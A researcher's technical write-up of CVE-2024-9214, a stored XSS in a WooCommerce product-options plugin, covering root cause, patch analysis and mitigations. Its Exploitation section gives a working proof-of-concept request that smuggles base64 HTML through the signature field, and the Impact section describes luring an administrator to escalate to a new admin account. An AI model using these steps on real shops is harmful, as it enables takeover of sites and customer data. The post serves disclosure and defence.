---
title: "CVE-2024-9214: Unauth Stored XSS in Extra Product Options Builder for WooCommerce"
date: 2024-10-25
author: Aitor F.
description: Technical analysis of CVE-2024-9214, an unauthenticated stored XSS in Extra Product Options Builder for WooCommerce.
isStarred: false
draft: false
toc: true
tags: ["infosec", "cve", "xss", "wordpress", "woocommerce"]
# Vulnerability facts: rendered as the summary table at the top of the post
# (layouts/_partials/vuln-summary.html) and fed into the JSON-LD in schema.html.
cve: "CVE-2024-9214"
product: "Extra Product Options Builder for WooCommerce"
affected: "<= 1.2.133"
fixed: "1.2.134"
cvss: "6.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)"
advisory: "https://www.wordfence.com/threat-intel/vulnerabilities/id/09890f42-b9ee-4812-8cf2-f638ba9fb20f"
---

## TL;DR

CVE-2024-9214 is a stored XSS in Extra Product Options Builder for WooCommerce up to version 1.2.133 that lets an unauthenticated attacker store an HTML file on the server through the signature field and run JavaScript on the shop's domain when someone opens it.

## Background

[Extra Product Options Builder for WooCommerce](https://wordpress.org/plugins/additional-product-fields-for-woocommerce/) (slug `additional-product-fields-for-woocommerce`, by RedNao) is a WordPress plugin for adding custom fields to the products of a WooCommerce shop: text inputs, selectors, file uploads, price formulas… One of those field types is **Signature**, a canvas where the customer signs before adding the product to the cart.

The browser turns that drawing into a base64-encoded PNG (`data:image/png;base64,...`) and sends it to the server along with the rest of the fields. The server decodes it, writes it to disk and links to it from the cart and from the order.

In this post we'll see that the plugin didn't check that the signature was an image, and that the endpoint that serves it decides the `Content-Type` by looking at the file's contents. Put both together and anyone can host an arbitrary HTML page on the shop's domain.

All the code shown is from version 1.2.133 ([r3164437](https://plugins.trac.wordpress.org/browser/additional-product-fields-for-woocommerce/trunk?rev=3164437)), the last vulnerable one.

## Root cause

### Writing the signature

When a product is added to the cart, the WooCommerce form includes a `RednaoSerializedFields` parameter with a JSON object holding the value of each field. The plugin processes it in the `woocommerce_add_cart_item_data` filter ([`WooStagesManager.php`](https://plugins.trac.wordpress.org/browser/additional-product-fields-for-woocommerce/trunk/core/Managers/WooStagesManager.php?rev=3164437#L465)):

```php
public function AddCartItemData($cart_item_meta, $product_id){
    if(isset($_POST['RednaoSerializedFields']))
    {
        $data=\json_decode(\stripslashes($_POST['RednaoSerializedFields']));
        // ...
        $form=new FormBuilder($this->Loader,$options,$data,$product);
        $form->Initialize();
        $lineItems=$form->GenerateLineItems();
        // ...
    }
    return $cart_item_meta;
}
```

`GenerateLineItems()` iterates over the fields and calls `GetLineItems()` on each one. For the signature ([`FBSignature.php`](https://plugins.trac.wordpress.org/browser/additional-product-fields-for-woocommerce/trunk/core/Managers/FormManager/Fields/FBSignature.php?rev=3164437#L23)), the value goes straight to the file manager:

```php
public function GetLineItems(){
    if($this->Entry==null||$this->GetEntryValue('Value','')==='')
        return array();

    $fileManager=new FileManager($this->Loader);
    $this->Entry->Path=$fileManager->TemporaryUploadSignature($this->GetEntryValue('Value',''));
    // ...
}
```

And [`TemporaryUploadSignature()`](https://plugins.trac.wordpress.org/browser/additional-product-fields-for-woocommerce/trunk/core/Managers/FileManager/FileManager.php?rev=3164437#L159) strips the `data:image/...;base64,` prefix if there is one, decodes what's left and writes it to the temporary folder with a `.png` extension:

```php
public function TemporaryUploadSignature($signature)
{
    $tempDir=$this->GetTempFolderRootPath();
    $fileName=uniqid("",true).'.png';
    $fileName=wp_unique_filename($tempDir,$fileName);

    $data = base64_decode( preg_replace( '#^data:image/\w+;base64,#i', '', $signature ) );
    $save_signature = file_put_contents( $tempDir.$fileName, $data );

    return $tempDir.$fileName;
}
```

At no point is the decoded data checked to be a PNG, or an image at all. Whatever we send in `Fields[n].Value` ends up as is in `wp-content/uploads/rednaowooextraproduct/temp/<uniqid>.png`.

On its own, this wouldn't be enough. The `temp/` folder is created with an `.htaccess` containing `deny from all`, so on Apache the file can't be requested directly. And even if it could (nginx ignores `.htaccess`), the server would serve it as `image/png` based on the extension and the browser wouldn't treat it as HTML. The full problem shows up when we look at how the plugin itself serves it.

### Reading the signature

To display the signature in the cart, the plugin links to it through an AJAX endpoint ([`OrderDesignerAjax.php`](https://plugins.trac.wordpress.org/browser/additional-product-fields-for-woocommerce/trunk/ajax/OrderDesignerAjax.php?rev=3164437#L20)) registered as public and without a nonce:

```php
protected function RegisterHooks()
{
    $this->RegisterPrivate('getfileupload','GetFileUpload');
    $this->RegisterPublic('getpublicfileupload','GetFileUpload',false);
    // ...
}
```

`RegisterPublic()` registers it on both `wp_ajax_` and `wp_ajax_nopriv_`, and the third argument (`false`) disables nonce validation. In other words, anyone can call `admin-ajax.php?action=rednaowooextraproduct_getpublicfileupload` and download a file from `temp/` or `OrderFiles/` if they know its name.

```php
public function GetFileUpload(){
    if(!isset($_GET['path']))
        $this->SendErrorMessage('Invalid operation');

    $path=sanitize_file_name(basename(\strval($_GET['path'])));
    $name=$_GET['name'];
    if($name=='signature')
        $name='signature.png';
    $manager=new FileManager($this->Loader);

    if(isset($_GET['temp']))
    {
        $baseDir=$manager->GetTempFolderRootPath();
    }else
        $baseDir=$manager->GetOrderFolderRootPath();
    $realPath=$baseDir.$path;
    // ...
    header('Content-Disposition: '.($name=='signature.png'?'inline':'attachment').'; filename="'.$name.'"');
    header('Content-Type: '.\mime_content_type($realPath));

    header('Content-Length: ' . filesize($realPath));
    readfile($realPath);
    exit;
}
```

`basename()` and `sanitize_file_name()` prevent path traversal, but two details are what make the file execute:

- **`Content-Type` derived from the contents:** `mime_content_type()` uses libmagic, which identifies the type by reading the first bytes of the file and ignores the extension. A file starting with `<script>` is detected as `text/html` even if it's called `.png`.

- **`Content-Disposition: inline` for signatures:** if `name` is `signature`, the file is served to be displayed in the browser instead of as a download.

So the browser gets a `text/html`, inline response from `https://<target>/wp-admin/admin-ajax.php`, and renders it like any other page on the site.

The underlying problem is that the plugin trusts the signature field to always be filled in by its own canvas. The only check that it's a PNG lives in the client-side JavaScript, and instead of enforcing the type it expects (`image/png`), the server asks the file what it is.

## Scope

To exploit it you need at least one product with a **Signature** field. Nothing else. Adding to the cart doesn't require an account, and the read endpoint is public. There's no need to guess the file name (`uniqid()`), because the attacker's own cart shows the link.

### Impact

The JavaScript runs on the shop's origin, so it has access to everything the user who opens the link has access to on that domain. The victim has to open the link, but that's not hard: it's a URL on the shop's own domain, with nothing suspicious in sight, that can be sent to an administrator through the contact form or the support chat ("the signature on my order looks wrong, could you take a look?").

If an administrator with an active session opens it, the script can make requests to `/wp-admin/` with their cookies and read the responses, since it's the same origin. With that it can grab whatever nonces it needs and, for example, create an administrator user, or edit a plugin or theme from the dashboard editor, which in practice means code execution on the server. WordPress session cookies are `HttpOnly`, but there's no need to steal them either.

## Exploitation

The add-to-cart request is the product's regular form. The only thing we care about is the `RednaoSerializedFields` parameter, which with a legitimate signature looks like this:

```json
{"Fields":[{"Label":"Signature","Id":1,"Type":"signature","GlobalId":null,"PriceType":"fixed_amount","Price":24,"SalePrice":0,"Quantity":1,"UnitPrice":24,"Value":"data:image/png;base64,iVBORw0KGgo[...]"}],"PreviousCartKey":"","Totals":{"ProductPrice":0,"OptionsTotal":24,"GrandTotal":24,"OptionsUnitPrice":24}}
```

To exploit it, just intercept or replay that request, replacing `Fields[0].Value` with whatever HTML we want, base64-encoded. For example:

```console
~$ printf '<script>alert(document.domain);</script>' | base64
PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pg==
```

```json
{"Fields":[{"Label":"Signature","Id":1,"Type":"signature","GlobalId":null,"PriceType":"fixed_amount","Price":24,"SalePrice":0,"Quantity":1,"UnitPrice":24,"Value":"data:image/png;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pg=="}],"PreviousCartKey":"","Totals":{"ProductPrice":0,"OptionsTotal":24,"GrandTotal":24,"OptionsUnitPrice":24}}
```

The product is added to the cart without complaint. On the cart page, the product's *Signature* section links to the generated file:

```text
https://<target>/wp-admin/admin-ajax.php?action=rednaowooextraproduct_getpublicfileupload&path=66e45c77379f13.93740556.png&name=signature&temp=true
```

Opening that link runs the `alert(document.domain)`. The file stays on the server and the link works for anyone who opens it.

## Patch analysis

The fix is in [changeset 3173169](https://plugins.trac.wordpress.org/changeset/3173169/), released as version 1.2.134. The relevant change is in `FBSignature::GetLineItems()`, which now validates the value before writing it:

```php
$value=$this->GetEntryValue('Value','');
if(!$this->IsValidBase64Image($value)){
    throw new \Exception('Invalid signature image');
}
```

```php
private function IsValidBase64Image($data) {
    // Check if the data matches the data:image/png;base64 format
    if (preg_match('/^data:image\/png;base64,/', $data)) {
        // Remove the data:image/png;base64, part
        $data = substr($data, strpos($data, ',') + 1);

        // Decode the base64 string
        $decodedData = base64_decode($data, true);

        // Check if the decoded data is valid
        if ($decodedData !== false) {
            // Create an image resource from the decoded data
            $image = imagecreatefromstring($decodedData);

            // Check if the image resource is valid
            if ($image !== false) {
                // Free up memory
                imagedestroy($image);
                return true;
            }
        }
    }
    return false;
}
```

It now requires the `data:image/png;base64,` prefix, decodes in strict mode and uses GD to check that the contents are an image it can open. A few details:

- `imagecreatefromstring()` accepts any format GD supports (PNG, JPEG, GIF, WebP, BMP…), not just PNG, so the prefix check is mostly cosmetic. Still, what matters is that the contents are a valid image, and a valid image starts with its magic bytes, so libmagic will identify it as `image/*` rather than `text/html`. A PNG polyglot with HTML inside a text chunk would be served as `image/png`, and browsers don't render an `image/*` response as HTML.
- `TemporaryUploadSignature()` and `GetFileUpload()` are unchanged in this patch. The endpoint still derives the `Content-Type` from the contents and serves signatures inline, so the protection relies entirely on validation at write time. That's enough for this vector, but if another code path ever wrote to `temp/` or `OrderFiles/` without validating, it would be exploitable again.
- Validation happens before anything is written, so an invalid signature leaves no file on disk: an exception is thrown and the product isn't added to the cart.

Much later, in 1.2.176 ([r3626182](https://plugins.trac.wordpress.org/changeset/3626182/), July 2026), the endpoint was hardened on its own: public downloads require an HMAC token tied to the file (and, for temporary files, to the uploader's WooCommerce session), paths are resolved with `realpath()`, and the `X-Content-Type-Options: nosniff` and `Cache-Control: private, no-store` headers are added.

## Mitigation

- Update the plugin to version 1.2.134 or later.
- If you can't update, temporarily removing *Signature* fields from products closes the vector, although the endpoint would keep serving any files that already exist.
- Check `wp-content/uploads/rednaowooextraproduct/temp/` and `OrderFiles/` for `.png` files that aren't images, in case it was exploited before updating.

## Timeline

- **13/09/2024:** initial report.
- **21/10/2024:** version 1.2.134 released with the fix.
- **23/10/2024:** Wordfence advisory published.
- **24/10/2024:** CVE-2024-9214 published.

## References

- [CVE-2024-9214](https://www.cve.org/CVERecord?id=CVE-2024-9214)
- [Wordfence: Extra Product Options Builder for WooCommerce <= 1.2.133 - Unauthenticated Stored Cross-Site Scripting](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/additional-product-fields-for-woocommerce/extra-product-options-builder-for-woocommerce-12133-unauthenticated-stored-cross-site-scripting)
- [Extra Product Options Builder for WooCommerce on WordPress.org](https://wordpress.org/plugins/additional-product-fields-for-woocommerce/)
